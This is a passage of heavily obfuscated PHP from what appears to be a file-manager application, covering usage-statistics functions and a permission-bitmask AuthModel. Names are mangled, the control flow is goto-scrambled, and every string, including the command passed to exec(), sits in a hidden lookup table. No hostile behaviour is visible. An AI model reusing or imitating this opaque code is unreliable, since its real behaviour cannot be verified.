$A¹‹«çé‰[$cÚñÓÍ—öé][$AâÀò³ç[274]]; return !0; } public function listData($F¥ç¨ß°‹’ = false, $eÒ¥ÒÛñ´ç = "\x6d\157\144\151\146\171\124\151\155\145", $FîÉ®ÀÛÈç = false) { return parent::listData($F¥ç¨ß°‹’, $eÒ¥ÒÛñ´ç, $FîÉ®ÀÛÈç); } public function trendList($aŸÈƒÅªó¡) { goto f’ùÙ›å©³; b£‘ßÀ: foreach ($aÃ›ªô´øÈ as $d¸»Ğµâîœ) { $this->{$FÈë‘Éé°}($d¸»Ğµâîœ); } return $this->listData(); goto B¹éÑæèÂ; BÖÂƒ…êˆ‘: if (!isset($cÊ©²ÉŸ’“)) { $aÌˆï¤Ñ’ô = $aŸÈƒÅªó¡ == $A…çôÛ÷ö[547] ? $A…çôÛ÷ö[490] : $A…çôÛ÷ö[742]; $cÊ©²ÉŸ’“ = Model($aÌˆï¤Ñ’ô)->min($A…çôÛ÷ö[201]); } $FÈë‘Éé° = $A…çôÛ÷ö[2030] . ucfirst($aŸÈƒÅªó¡); $aÃ›ªô´øÈ = $this->dateList($cÊ©²ÉŸ’“); goto b£‘ßÀ; f’ùÙ›å©³: $A…çôÛ÷ö =& $_SERVER[¨¤¼…´]; $FÍ®­¢‘¬™ = $this->listData(); if ($FÍ®­¢‘¬™) { $b¸„Å¬˜òŠ = end($FÍ®­¢‘¬™); $d¸»Ğµâîœ = date($A…çôÛ÷ö[2028], strtotime($A…çôÛ÷ö[2029])); if ($b¸„Å¬˜òŠ[$A…çôÛ÷ö[224]] == $d¸»Ğµâîœ) { return $FÍ®­¢‘¬™; } $cÊ©²ÉŸ’“ = strtotime($b¸„Å¬˜òŠ[$A…çôÛ÷ö[224]]); } goto BÖÂƒ…êˆ‘; B¹éÑæèÂ: } private function dateList($cæºÊÏˆÌì) { $FÓİ®ìŞ±è =& $_SERVER[¨¤¼…´]; $c¢¸ƒ¸š = $cæºÊÏˆÌì; $C¹—ò£¼  = strtotime($FÓİ®ìŞ±è[2029]); $cõ¶Â¥£Ö = array(); while ($c¢¸ƒ¸š <= $C¹—ò£¼ ) { $cõ¶Â¥£Ö[] = date($FÓİ®ìŞ±è[2028], $c¢¸ƒ¸š); $c¢¸ƒ¸š = strtotime($FÓİ®ìŞ±è[2031], $c¢¸ƒ¸š); } return $cõ¶Â¥£Ö; } public function _recordUser($EÀ×Ôêô‰Â = '') { goto DÉÃ¶Ş‹†; bê²›¦™ÏÑ: $eÛ‹ù£•Š» = array($D‹»·º‚í³[201] => array($D‹»·º‚í³[913], $eÊ­„»áÖÏ)); $e™Î¥ÏõË´ = Model($D‹»·º‚í³[490])->where($eÛ‹ù£•Š»)->count($D‹»·º‚í³[1425]); $eÛ‹ù£•Š»[$D‹»·º‚í³[201]] = array($D‹»·º‚í³[334], array($fÙŞ†©±Ôˆ, $eÊ­„»áÖÏ)); goto e·˜•ø¾ä¯; EÎÈÄ—“ëì: $C÷é²®‹£ = array($D‹»·º‚í³[224] => $EÀ×Ôêô‰Â, $D‹»·º‚í³[690] => (int) $e™Î¥ÏõË´, $D‹»·º‚í³[2021] => (int) $AÌ™»ƒø„£, $D‹»·º‚í³[2022] => (int) $b÷…ï¹œÍŠ); return $this->insert($C÷é²®‹£); goto c¢¦‹‚ğ»±; DÉÃ¶Ş‹†: $D‹»·º‚í³ =& $_SERVER[¨¤¼…´]; $fÙŞ†©±Ôˆ = strtotime(date($D‹»·º‚í³[2032], strtotime($EÀ×Ôêô‰Â))); $eÊ­„»áÖÏ = strtotime(date($D‹»·º‚í³[2033], strtotime($EÀ×Ôêô‰Â))); goto bê²›¦™ÏÑ; e·˜•ø¾ä¯: $AÌ™»ƒø„£ = Model($D‹»·º‚í³[490])->where($eÛ‹ù£•Š»)->count($D‹»·º‚í³[1425]); $eÛ‹ù£•Š»[$D‹»·º‚í³[39]] = $D‹»·º‚í³[2034]; $b÷…ï¹œÍŠ = Model($D‹»·º‚í³[2035])->where($eÛ‹ù£•Š»)->count($D‹»·º‚í³[2036]); goto EÎÈÄ—“ëì; c¢¦‹‚ğ»±: } public function _recordStore($D½æ‹êØ„ = '') { goto Cê¶ÎÓÍ; B¦†Òˆ‹: $f…ˆ‚¦©®[$fê³§¨£Ø[383]] = 1; $Bó‡È«¤ç = Model($fê³§¨£Ø[742])->where($f…ˆ‚¦©®)->sum($fê³§¨£Ø[87]); $f…ˆ‚¦©®[$fê³§¨£Ø[383]] = 2; goto eù»ÕËÜ; eù»ÕËÜ: $eºéèñ³©² = Model($fê³§¨£Ø[742])->where($f…ˆ‚¦©®)->sum($fê³§¨£Ø[87]); $F¤–‘œÎ = array($fê³§¨£Ø[224] => $D½æ‹êØ„, $fê³§¨£Ø[688] => (int) $aïïÅÓÌÓ, $fê³§¨£Ø[2025] => (int) $bóÚö÷©é, $fê³§¨£Ø[2026] => (int) $Bó‡È«¤ç, $fê³§¨£Ø[2027] => (int) $eºéèñ³©²); return $this->insert($F¤–‘œÎ); goto bºŒâ’Ê; D°åÌ÷ò‹ò: $bóÚö÷©é = Model($fê³§¨£Ø[434])->where($f…ˆ‚¦©®)->sum($fê³§¨£Ø[87]); $f…ˆ‚¦©®[$fê³§¨£Ø[382]] = 0; $aïïÅÓÌÓ = Model($fê³§¨£Ø[742])->where($f…ˆ‚¦©®)->sum($fê³§¨£Ø[87]); goto B¦†Òˆ‹; Cê¶ÎÓÍ: $fê³§¨£Ø =& $_SERVER[¨¤¼…´]; $AÊ¤Ÿİ­ˆè = strtotime(date($fê³§¨£Ø[2033], strtotime($D½æ‹êØ„))); $f…ˆ‚¦©® = array($fê³§¨£Ø[201] => array($fê³§¨£Ø[913], $AÊ¤Ÿİ­ˆè)); goto D°åÌ÷ò‹ò; bºŒâ’Ê: } public function trend($A°ñËÄõ†ˆ, $D¶Ñ£ª”±) { goto Bò„šÉ¢ ; cÌ§°²ÍÚ: if ($D³Ôß¤”¯À && $D¶Ñ£ª”± != $c»’İîÓ‹”[1400]) { $E«†Ş£¥½ˆ = $D³Ôß¤”¯À[0][$c»’İîÓ‹”[224]]; $eÜ¬¬îŸˆï = $this->validDate($D¶Ñ£ª”±, $E«†Ş£¥½ˆ); $dôáøá¥ = array(); $EÒË›ù¼ÏÂ = array_to_keyvalue($D³Ôß¤”¯À, $c»’İîÓ‹”[224]); foreach ($eÜ¬¬îŸˆï as $e°µ›åíß) { if (isset($EÒË›ù¼ÏÂ[$e°µ›åíß])) { $c«–ò©‚ëë = $EÒË›ù¼ÏÂ[$e°µ›åíß]; } else { $c«–ò©‚ëë = end($D³Ôß¤”¯À); $c«–ò©‚ëë[$c»’İîÓ‹”[224]] = $e°µ›åíß; if ($A°ñËÄõ†ˆ == $c»’İîÓ‹”[547]) { $c«–ò©‚ëë[$c»’İîÓ‹”[2021]] = $c«–ò©‚ëë[$c»’İîÓ‹”[2022]] = 0; } } $dôáøá¥[] = $c«–ò©‚ëë; } $D³Ôß¤”¯À = $dôáøá¥; } $e¬ŸºŒ×½â = array($c»’İîÓ‹”[547] => array($c»’İîÓ‹”[690] => LNG($c»’İîÓ‹”[2037]), $c»’İîÓ‹”[2021] => LNG($c»’İîÓ‹”[2038]), $c»’İîÓ‹”[2022] => LNG($c»’İîÓ‹”[2039])), $c»’İîÓ‹”[2023] => array($c»’İîÓ‹”[688] => LNG($c»’İîÓ‹”[2040]), $c»’İîÓ‹”[2025] => LNG($c»’İîÓ‹”[2041]), $c»’İîÓ‹”[2026] => LNG($c»’İîÓ‹”[2042]), $c»’İîÓ‹”[2027] => LNG($c»’İîÓ‹”[2043]))); $CŠº‡‹¾Ó = array($c»’İîÓ‹”[547] => $c»’İîÓ‹”[2044], $c»’İîÓ‹”[2023] => $c»’İîÓ‹”[87]); goto dâ¶ùÛ‘µ¤; FïìíÍËÍ: return $BŒß»ò®; goto d¶‰æÊ±Ä©; Bò„šÉ¢ : $c»’İîÓ‹” =& $_SERVER[¨¤¼…´]; if (!$this->init($A°ñËÄõ†ˆ)) { return !1; } $D³Ôß¤”¯À = $this->trendList($A°ñËÄõ†ˆ); goto cÌ§°²ÍÚ; dâ¶ùÛ‘µ¤: if (empty($D³Ôß¤”¯À)) { $e°µ›åíß = date($c»’İîÓ‹”[2028], strtotime($c»’İîÓ‹”[2029])); $C©’İé·Ò¯ = array($c»’İîÓ‹”[224] => $e°µ›åíß); foreach ($e¬ŸºŒ×½â[$A°ñËÄõ†ˆ] as $D‰¸åœÙ‚ => $F‘Ïİ‰¶­ˆ) { $C©’İé·Ò¯[$D‰¸åœÙ‚] = 0; } $D³Ôß¤”¯À[] = $C©’İé·Ò¯; } $BŒß»ò® = array(); foreach ($D³Ôß¤”¯À as $F‘Ïİ‰¶­ˆ) { if ($A°ñËÄõ†ˆ == $c»’İîÓ‹”[2023] && $F‘Ïİ‰¶­ˆ[$c»’İîÓ‹”[2025]] > $F‘Ïİ‰¶­ˆ[$c»’İîÓ‹”[688]]) { $F‘Ïİ‰¶­ˆ[$c»’İîÓ‹”[2025]] = $F‘Ïİ‰¶­ˆ[$c»’İîÓ‹”[688]]; } foreach ($e¬ŸºŒ×½â[$A°ñËÄõ†ˆ] as $D‰¸åœÙ‚ => $BŸº‘ÆˆÍŠ) { $c«–ò©‚ëë = array($c»’İîÓ‹”[224] => $F‘Ïİ‰¶­ˆ[$c»’İîÓ‹”[224]], $c»’İîÓ‹”[1331] => $BŸº‘ÆˆÍŠ); $c«–ò©‚ëë[$CŠº‡‹¾Ó[$A°ñËÄõ†ˆ]] = isset($F‘Ïİ‰¶­ˆ[$D‰¸åœÙ‚]) ? $F‘Ïİ‰¶­ˆ[$D‰¸åœÙ‚] : 0; $BŒß»ò®[] = $c«–ò©‚ëë; } } goto FïìíÍËÍ; d¶‰æÊ±Ä©: } public function validDate($d§Ê¯îõÅ, $A…óÖ™âï) { goto c‘ñ«¶ßÍ; e´Ù«îÕÏ„: switch ($d§Ê¯îõÅ) { case $fº«™•õ[1407]: $D®³Àà¹Ò³ = mktime(0, 0, 0, date($fº«™•õ[2045]), date($fº«™•õ[2046]) - date($fº«™•õ[1215]) + 7 - 7, date($fº«™•õ[2047])); $Eœ‘ºÂœğ = 0; do { $Fõæ¥ÅŸ®Ö = date($fº«™•õ[2028], $D®³Àà¹Ò³ - 3600 * 24 * 7 * $Eœ‘ºÂœğ); $fÀÖÂ½Ä®[] = $Fõæ¥ÅŸ®Ö; $Eœ‘ºÂœğ++; } while ($A…óÖ™âï < $Fõæ¥ÅŸ®Ö); break; case $fº«™•õ[1405]: $Eœ‘ºÂœğ = 1; do { $BÎª“ƒ‚Ÿ÷ = date($fº«™•õ[2048], strtotime("\x2d\40{$Eœ‘ºÂœğ}\x20\x6d\x6f\156\x74\x68\163")); $fÀÖÂ½Ä®[] = $BÎª“ƒ‚Ÿ÷; $Eœ‘ºÂœğ++; } while ($A…óÖ™âï < $BÎª“ƒ‚Ÿ÷); break; case $fº«™•õ[1712]: $bØ†›ãÂµ¦ = (int) date($fº«™•õ[2047], strtotime($A…óÖ™âï)); $b…¨ÄŸ‚µÎ = (int) date($fº«™•õ[2047]); if ($bØ†›ãÂµ¦ >= $b…¨ÄŸ‚µÎ) { break; } for ($bØ†›ãÂµ¦; $bØ†›ãÂµ¦ < $b…¨ÄŸ‚µÎ; $bØ†›ãÂµ¦++) { $fÀÖÂ½Ä®[] = $bØ†›ãÂµ¦ . $fº«™•õ[2049]; } break; default: break; } if ($A…óÖ™âï > end($fÀÖÂ½Ä®)) { array_pop($fÀÖÂ½Ä®); } sort($fÀÖÂ½Ä®); goto D“œßéÔÊ«; c‘ñ«¶ßÍ: $fº«™•õ =& $_SERVER[¨¤¼…´]; $a·œ—Ã Ô‘ = date($fº«™•õ[2028], strtotime($fº«™•õ[2029])); $fÀÖÂ½Ä® = array($a·œ—Ã Ô‘); goto e´Ù«îÕÏ„; D“œßéÔÊ«: return $fÀÖÂ½Ä®; goto C™áô–£Ò¨; C™áô–£Ò¨: } public function listTable($C¤ßÅÊñÍª) { $Cñ­„™Ë• = ucfirst($C¤ßÅÊñÍª); return Model($Cñ­„™Ë•)->listData(); } public function option($CËïë¤™ò) { $cÚàŒĞ¹Ê = $_SERVER[¨¤¼…´][2050] . ucfirst($CËïë¤™ò); return $this->{$cÚàŒĞ¹Ê}(); } private function optionUser() { goto c®Æ˜¹†Åé; e„¢”°ôÅ: $Dõ„Ñ°Şõ = Model($Fº±†ğœàÊ[490])->where($Dñ‘£§Ò®ª)->count($Fº±†ğœàÊ[1425]); return array($Fº±†ğœàÊ[685] => (int) $BŸÛ÷å–ğí, $Fº±†ğœàÊ[2054] => (int) ($BŸÛ÷å–ğí - $fÊîŸÉà…), $Fº±†ğœàÊ[2055] => (int) $fÊîŸÉà…, $Fº±†ğœàÊ[2056] => (int) $Dõ„Ñ°Şõ, $Fº±†ğœàÊ[2057] => $c§ØŒ„ ×¡); goto fô…Ø‹…„ƒ; BƒïäÏ½œ: $bÌêœæå = strtotime($Fº±†ğœàÊ[2052]); $Dñ‘£§Ò®ª = array($Fº±†ğœàÊ[2053] => array($Fº±†ğœàÊ[914], $bÌêœæå)); $c§ØŒ„ ×¡ = (int) Model($Fº±†ğœàÊ[490])->where($Dñ‘£§Ò®ª)->count($Fº±†ğœàÊ[1425]); goto DôõÇšÌ¼; DôõÇšÌ¼: if (!$c§ØŒ„ ×¡) { $c§ØŒ„ ×¡ = 1; } $bÌêœæå = strtotime(date($Fº±†ğœàÊ[2032])); $Dñ‘£§Ò®ª = array($Fº±†ğœàÊ[2053] => array($Fº±†ğœàÊ[914], $bÌêœæå)); goto e„¢”°ôÅ; c®Æ˜¹†Åé: $Fº±†ğœàÊ =& $_SERVER[¨¤¼…´]; $BŸÛ÷å–ğí = Model($Fº±†ğœàÊ[490])->count($Fº±†ğœàÊ[1425]); $fÊîŸÉà… = Model($Fº±†ğœàÊ[490])->where($Fº±†ğœàÊ[2051])->count($Fº±†ğœàÊ[1425]); goto BƒïäÏ½œ; fô…Ø‹…„ƒ: } private function optionFile() { goto F¹ß×¡Ôñ¯; EæòÂ‚ïµ: $CåíõŠÒÅ = $aÉ·î¢‚Ó¹[$cÏ…‹ ©Æ[2025]]; $e®š±—Ü½Ì = Model($cÏ…‹ ©Æ[742])->where(array($cÏ…‹ ©Æ[382] => 0))->count($cÏ…‹ ©Æ[381]); $BîÅ‘œÑ½ï = array($cÏ…‹ ©Æ[382] => 0, $cÏ…‹ ©Æ[201] => array($cÏ…‹ ©Æ[914], strtotime(date($cÏ…‹ ©Æ[2032])))); goto DÑˆ¸òò¸à; DÑˆ¸òò¸à: $cƒ‡ÜŸº = Model($cÏ…‹ ©Æ[742])->where($BîÅ‘œÑ½ï)->sum($cÏ…‹ ©Æ[87]); $e÷ğØ‚·ŠÎ = Model($cÏ…‹ ©Æ[742])->where($BîÅ‘œÑ½ï)->count($cÏ…‹ ©Æ[381]); return array($cÏ…‹ ©Æ[688] => $eñ¾­ˆÏé, $cÏ…‹ ©Æ[2025] => $CåíõŠÒÅ, $cÏ…‹ ©Æ[2058] => $eñ¾­ˆÏé - $CåíõŠÒÅ, $cÏ…‹ ©Æ[2059] => (int) $cƒ‡ÜŸº, $cÏ…‹ ©Æ[690] => (int) $e®š±—Ü½Ì, $cÏ…‹ ©Æ[2060] => (int) $e÷ğØ‚·ŠÎ); goto bÌ“¶Ìœ†‰; F¹ß×¡Ôñ¯: $cÏ…‹ ©Æ =& $_SERVER[¨¤¼…´]; $aÉ·î¢‚Ó¹ = $this->sourceSize(); $eñ¾­ˆÏé = $aÉ·î¢‚Ó¹[$cÏ…‹ ©Æ[87]]; goto EæòÂ‚ïµ; bÌ“¶Ìœ†‰: } private function optionAccess() { $dœˆËÉ¶Ó¹ =& $_SERVER[¨¤¼…´]; return array($dœˆËÉ¶Ó¹[685] => $this->typeLogCnt(), $dœˆËÉ¶Ó¹[113] => $this->typeLogCnt($dœˆËÉ¶Ó¹[113]), $dœˆËÉ¶Ó¹[416] => $this->typeLogCnt($dœˆËÉ¶Ó¹[416]), $dœˆËÉ¶Ó¹[2061] => $this->typeLogCnt($dœˆËÉ¶Ó¹[2061]), $dœˆËÉ¶Ó¹[2062] => $this->typeLogCnt($dœˆËÉ¶Ó¹[2062]), $dœˆËÉ¶Ó¹[547] => $this->typeLogCnt($dœˆËÉ¶Ó¹[43], $dœˆËÉ¶Ó¹[2036])); } private function typeLogCnt($CäƒÂè†Œ = '', $cîì²ğÃÆ = "\151\x64") { goto EÌÍ‡ÚÏÖ; D£›¤‚½Ùê: return (int) $D×¿–èÇÈø; goto E‰¨‰ÓŒ×ˆ; Bå™ì‘§‹: $Añ ƒ‡õÒ¬ = array($cÅ¸ÂØêŸ«[201] => array($cÅ¸ÂØêŸ«[914], $a¢¶ï‰ÂŸ)); if ($CäƒÂè†Œ) { $Añ ƒ‡õÒ¬[$cÅ¸ÂØêŸ«[39]] = array($cÅ¸ÂØêŸ«[7], $Fßå¢šÃŸØ[$CäƒÂè†Œ]); } $D×¿–èÇÈø = Model($cÅ¸ÂØêŸ«[2035])->where($Añ ƒ‡õÒ¬)->count($cîì²ğÃÆ); goto D£›¤‚½Ùê; EÌÍ‡ÚÏÖ: $cÅ¸ÂØêŸ« =& $_SERVER[¨¤¼…´]; $Fßå¢šÃŸØ = array($cÅ¸ÂØêŸ«[113] => array($cÅ¸ÂØêŸ«[2063], $cÅ¸ÂØêŸ«[2064]), $cÅ¸ÂØêŸ«[416] => array($cÅ¸ÂØêŸ«[2065], $cÅ¸ÂØêŸ«[2066]), $cÅ¸ÂØêŸ«[2061] => array($cÅ¸ÂØêŸ«[2067], $cÅ¸ÂØêŸ«[2068], $cÅ¸ÂØêŸ«[2069]), $cÅ¸ÂØêŸ«[2062] => array($cÅ¸ÂØêŸ«[2070], $cÅ¸ÂØêŸ«[2071]), $cÅ¸ÂØêŸ«[2072] => array($cÅ¸ÂØêŸ«[2073], $cÅ¸ÂØêŸ«[2074], $cÅ¸ÂØêŸ«[2075])); $a¢¶ï‰ÂŸ = strtotime(date($cÅ¸ÂØêŸ«[2032])); goto Bå™ì‘§‹; E‰¨‰ÓŒ×ˆ: } private function optionServer() { goto eÇâêéºÏ¢; eÇâêéºÏ¢: $eÄ¼òÜœ™ =& $_SERVER[¨¤¼…´]; $a©°ØºÚó = $this->diskDriver(); $eÃâè¼±Ó· = KodIO::defaultDriver(); goto C«Õ´³†‘°; DŠ‡Úô–Ø: if ($Bù¶Â×Ê¬ == $eÄ¼òÜœ™[713]) { $dŸà§í•ª¥ = explode($eÄ¼òÜœ™[1066], $BĞ©öš³ğÎ[$eÄ¼òÜœ™[873]]); $Bù¶Â×Ê¬ = $dŸà§í•ª¥[0]; } if ($Bù¶Â×Ê¬ == $eÄ¼òÜœ™[716] || $Bù¶Â×Ê¬ == $eÄ¼òÜœ™[717]) { $fµÈºó•† = Model()->db()->query($eÄ¼òÜœ™[2076]); $aê÷ÔšùùØ = $fµÈºó•†[0] && isset($fµÈºó•†[0][$eÄ¼òÜœ™[1330]]) ? $fµÈºó•†[0][$eÄ¼òÜœ™[1330]] : 0; $Bù¶Â×Ê¬ = $eÄ¼òÜœ™[2077] . ($aê÷ÔšùùØ ? $eÄ¼òÜœ™[8] . $aê÷ÔšùùØ : $eÄ¼òÜœ™[43]); } $e‹ì–•ø®Ş = $GLOBALS[$eÄ¼òÜœ™[6]][$eÄ¼òÜœ™[350]][$eÄ¼òÜœ™[744]]; goto dºÑ´ÍÕÕ; BˆŸ‘‚â­Ø: $b„ˆÜª¯óß = $aå‹ƒĞ·ÅÚ[0]; $BĞ©öš³ğÎ = $GLOBALS[$eÄ¼òÜœ™[6]][$eÄ¼òÜœ™[27]]; $Bù¶Â×Ê¬ = $BĞ©öš³ğÎ[$eÄ¼òÜœ™[874]]; goto DŠ‡Úô–Ø; dºÑ´ÍÕÕ: return array($eÄ¼òÜœ™[2078] => $a©°ØºÚó ? $a©°ØºÚó[$eÄ¼òÜœ™[2079]] : 0, $eÄ¼òÜœ™[2080] => $a©°ØºÚó ? $a©°ØºÚó[$eÄ¼òÜœ™[2081]] : 0, $eÄ¼òÜœ™[2082] => (int) $eÃâè¼±Ó·[$eÄ¼òÜœ™[2079]] * 1024 * 1024 * 1024, $eÄ¼òÜœ™[2083] => (int) $BœéÒÒõŒ, $eÄ¼òÜœ™[2084] => ucfirst($b„ˆÜª¯óß), $eÄ¼òÜœ™[2085] => $eÄ¼òÜœ™[2086] . PHP_VERSION, $eÄ¼òÜœ™[2087] => phpBuild64() ? 64 : 32, $eÄ¼òÜœ™[684] => str_replace($eÄ¼òÜœ™[2088], $eÄ¼òÜœ™[890], $Bù¶Â×Ê¬), $eÄ¼òÜœ™[350] => ucfirst($e‹ì–•ø®Ş), $eÄ¼òÜœ™[38] => $_SERVER[$eÄ¼òÜœ™[2089]]); goto e¯³ñØª»; C«Õ´³†‘°: $B©âµ­Ê‚© = array($eÄ¼òÜœ™[733] => $eÃâè¼±Ó·[$eÄ¼òÜœ™[379]]); $BœéÒÒõŒ = Model($eÄ¼òÜœ™[434])->where($B©âµ­Ê‚©)->sum($eÄ¼òÜœ™[87]); $aå‹ƒĞ·ÅÚ = explode($eÄ¼òÜœ™[60], $_SERVER[$eÄ¼òÜœ™[149]]); goto BˆŸ‘‚â­Ø; e¯³ñØª»: } private function diskDriver() { goto BÜ¨ÒÎù¤; bİõ³ï‰àÈ: if ($cèø Ä·á) { $D×±Öˆ£Ÿ“ = $C§ĞËíÁ’«[2092]; if (function_exists($C§ĞËíÁ’«[2093])) { exec($C§ĞËíÁ’«[2094], $FˆÎŸÅÜ); $D×±Öˆ£Ÿ“ = $FˆÎŸÅÜ[1] . $C§ĞËíÁ’«[8]; } } if (!file_exists($D×±Öˆ£Ÿ“)) { return; } $E®ÃÇ‰½ = @disk_total_space($D×±Öˆ£Ÿ“); goto f•ÅÓ¾ÕÂ¡; f•ÅÓ¾ÕÂ¡: $a÷’¯ßœ­é = $E®ÃÇ‰½ - @disk_free_space($D×±Öˆ£Ÿ“); return array($C§ĞËíÁ’«[2079] => $E®ÃÇ‰½, $C§ĞËíÁ’«[2081] => $a÷’¯ßœ­é); goto A”²”ó£ç; BÜ¨ÒÎù¤: $C§ĞËíÁ’« =& $_SERVER[¨¤¼…´]; $D×±Öˆ£Ÿ“ = $C§ĞËíÁ’«[8]; $cèø Ä·á = $GLOBALS[$C§ĞËíÁ’«[6]][$C§ĞËíÁ’«[2090]] == $C§ĞËíÁ’«[2091]; goto bİõ³ï‰àÈ; A”²”ó£ç: } public function fileChart($e„¶¢‘ãÓï) { goto bêÛòˆ­æº; b™àŒÇ¹åÙ: $aš•š™ŒÜâ = $this->sourceSize(); $A’ì‡Åí¬” = array($eìˆëõ«´ß[474] => 0, $eìˆëõ«´ß[383] => 1); $cÉØâ¹Ñ”â = Model($eìˆëõ«´ß[742])->where($A’ì‡Åí¬”)->sum($eìˆëõ«´ß[87]); goto B‹¨¢•ø; B‹¨¢•ø: $A’ì‡Åí¬”[$eìˆëõ«´ß[383]] = 2; $FÖ«Ã®â¬“ = Model($eìˆëõ«´ß[742])->where($A’ì‡Åí¬”)->sum($eìˆëõ«´ß[87]); return array($eìˆëõ«´ß[688] => $aš•š™ŒÜâ[$eìˆëõ«´ß[87]], $eìˆëõ«´ß[2025] => $aš•š™ŒÜâ[$eìˆëõ«´ß[2025]], $eìˆëõ«´ß[2026] => (int) $cÉØâ¹Ñ”â, $eìˆëõ«´ß[2027] => (int) $FÖ«Ã®â¬“); goto C—…ƒ›ŒÌ; bêÛòˆ­æº: $eìˆëõ«´ß =& $_SERVER[¨¤¼…´]; if (isset($e„¶¢‘ãÓï[$eìˆëõ«´ß[1425]])) { return Model($eìˆëõ«´ß[742])->userFileTypeProfile($e„¶¢‘ãÓï[$eìˆëõ«´ß[1425]]); } if (isset($e„¶¢‘ãÓï[$eìˆëõ«´ß[2095]])) { return Model($eìˆëõ«´ß[742])->groupFileTypeProfile($e„¶¢‘ãÓï[$eìˆëõ«´ß[2095]]); } goto b™àŒÇ¹åÙ; C—…ƒ›ŒÌ: } private function sourceSize() { $fªôµ«ÅÑÆ =& $_SERVER[¨¤¼…´]; $d•Èº°Ôà… = Model($fªôµ«ÅÑÆ[742])->where(array($fªôµ«ÅÑÆ[382] => 0))->sum($fªôµ«ÅÑÆ[87]); $d…ÕÍÉ‚Êğ = Model($fªôµ«ÅÑÆ[434])->sum($fªôµ«ÅÑÆ[87]); if ($d…ÕÍÉ‚Êğ > $d•Èº°Ôà…) { $d…ÕÍÉ‚Êğ = $d•Èº°Ôà…; } return array($fªôµ«ÅÑÆ[87] => (int) $d•Èº°Ôà…, $fªôµ«ÅÑÆ[2025] => (int) $d…ÕÍÉ‚Êğ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $C±‡Â‰ëÊ¢ =& $_SERVER[¨¤¼…´]; $C®«¨×ƒ« = array(array($C±‡Â‰ëÊ¢[398] => LNG($C±‡Â‰ëÊ¢[2096]), $C±‡Â‰ëÊ¢[2097] => $C±‡Â‰ëÊ¢[2098], $C±‡Â‰ëÊ¢[2099] => 1, $C±‡Â‰ëÊ¢[2100] => 1, $C±‡Â‰ëÊ¢[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($C±‡Â‰ëÊ¢[398] => LNG($C±‡Â‰ëÊ¢[2102]), $C±‡Â‰ëÊ¢[2097] => $C±‡Â‰ëÊ¢[2103], $C±‡Â‰ëÊ¢[2099] => 2, $C±‡Â‰ëÊ¢[2100] => 1, $C±‡Â‰ëÊ¢[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($C±‡Â‰ëÊ¢[398] => LNG($C±‡Â‰ëÊ¢[2104]), $C±‡Â‰ëÊ¢[2097] => $C±‡Â‰ëÊ¢[2105], $C±‡Â‰ëÊ¢[2099] => 3, $C±‡Â‰ëÊ¢[2100] => 1, $C±‡Â‰ëÊ¢[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($C±‡Â‰ëÊ¢[398] => LNG($C±‡Â‰ëÊ¢[2106]), $C±‡Â‰ëÊ¢[2097] => $C±‡Â‰ëÊ¢[2107], $C±‡Â‰ëÊ¢[2099] => 4, $C±‡Â‰ëÊ¢[2100] => 1, $C±‡Â‰ëÊ¢[2101] => self::AUTH_SHOW | self::AUTH_VIEW), array($C±‡Â‰ëÊ¢[398] => LNG($C±‡Â‰ëÊ¢[2108]), $C±‡Â‰ëÊ¢[2097] => $C±‡Â‰ëÊ¢[2109], $C±‡Â‰ëÊ¢[2099] => 5, $C±‡Â‰ëÊ¢[2100] => 1, $C±‡Â‰ëÊ¢[2101] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($C±‡Â‰ëÊ¢[398] => LNG($C±‡Â‰ëÊ¢[2110]), $C±‡Â‰ëÊ¢[2097] => $C±‡Â‰ëÊ¢[2111], $C±‡Â‰ëÊ¢[2099] => 6, $C±‡Â‰ëÊ¢[2100] => 1, $C±‡Â‰ëÊ¢[2101] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($C±‡Â‰ëÊ¢[398] => LNG($C±‡Â‰ëÊ¢[2112]), $C±‡Â‰ëÊ¢[2097] => $C±‡Â‰ëÊ¢[2113], $C±‡Â‰ëÊ¢[2099] => 7, $C±‡Â‰ëÊ¢[2100] => 1, $C±‡Â‰ëÊ¢[2101] => 0)); return $C®«¨×ƒ«; } public static function authCheck($A²Ğë¢Ş¡, $D°í‡ƒÁ) { $A²Ğë¢Ş¡ = intval($A²Ğë¢Ş¡); if (_get($GLOBALS, $_SERVER[¨¤¼…´][470])) { return !0; } if ($A²Ğë¢Ş¡ <= 0) { return !1; } if (($A²Ğë¢Ş¡ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A²Ğë¢Ş¡ & $D°í‡ƒÁ); } public static function authCheckShow($BêèÛô•èÙ) { return self::authCheck($BêèÛô•èÙ, self::AUTH_SHOW); } public static function authCheckView($f˜ÖĞÈ‡İœ) { return self::authCheck($f˜ÖĞÈ‡İœ, self::AUTH_VIEW); } public static function authCheckDownload($bŒ˜ÆœİÄ) { return self::authCheck($bŒ˜ÆœİÄ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($D÷Ù÷ñìŠ›) { return self::authCheck($D÷Ù÷ñìŠ›, self::AUTH_UPLOAD); } public static function authCheckEdit($BößŞÓ£­) { return self::authCheck($BößŞÓ£­, self::AUTH_EDIT); } public static function authCheckRemove($AÂ°è‰¾©ƒ) { return self::authCheck($AÂ°è‰¾©ƒ, 